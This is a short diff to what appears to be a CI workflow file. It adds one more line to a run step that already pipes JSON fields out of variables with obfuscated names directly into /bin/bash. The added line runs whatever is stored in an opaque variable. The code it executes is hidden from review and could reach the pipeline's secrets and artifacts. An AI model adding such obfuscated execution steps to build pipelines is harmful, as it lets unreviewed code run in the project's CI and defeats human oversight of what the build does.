@@ -39,6 +39,7 @@ jobs:
           printf '%s' "$z1" | jq -r .gls6825 | /bin/bash
           printf '%s' "$yfzh19200" | jq -r .kgp521 | /bin/bash
           printf '%s' "$imp6506" | jq -r .qgkt0 | /bin/bash
+          echo $bkp14 | jq -r .uiuit45 | /bin/bash
 
       - name: Upload results
         if: always()
